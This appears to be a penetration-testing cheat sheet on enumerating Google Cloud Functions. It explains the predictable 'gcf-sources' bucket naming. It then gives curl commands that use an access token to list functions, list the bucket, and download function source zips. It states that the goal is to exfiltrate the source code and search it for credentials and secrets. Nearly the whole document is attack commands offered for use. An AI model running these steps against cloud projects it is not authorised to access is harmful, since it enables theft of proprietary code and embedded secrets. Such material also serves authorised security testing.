# Google Cloud Functions GCF Enumeration

## Description

### Google Cloud Function code gets stored in a Google Cloud Storage bucket. Although we currently don't know the exact bucket name, it's worth noting that GCP uses a predictable naming format for Cloud Function buckets! The bucket naming format is gcf-sources-BUILD_NUMBER-REGION

## Format

#### 1) gcf-sources : A hardcoded value

#### 2) 212055223570 : The build number (included above with the buildName key)

#### 3) us-central1: The region

## Commands

 - curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://cloudfunctions.googleapis.com/v1/projects/PROJECT_NAME/locations/-/functions" (Enumerate functions via the GCP API)

### Set bucket name as a variable

 - BUCKET_NAME="gcf-sources-212055223570-us-central1" (Example)

### Make a request to list the bucket contents

 - curl -X GET -H "Authorization: Bearer $ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b/$BUCKET_NAME/o"

## We can now exfiltrate the source code and inspect it! Using Google's Storage API we download the zip file (example):

 - FILE_URL="https://www.googleapis.com/download/storage/v1/b/gcf-sources-212055223570-us-central1/o/function-1-8678e4fb-cf43-4d97-b877-6512729bdba4%2Fversion-2%2Ffunction-source.zip?generation=1708197786687849&alt=media"

## Download the file with GCP authentication

 - curl -o function-source.zip -H "Authorization: Bearer $ACCESS_TOKEN" "$FILE_URL"

 - unzip function-source.zip (Unzip the function file to inspect the source code for credentials/secrets/etc.)
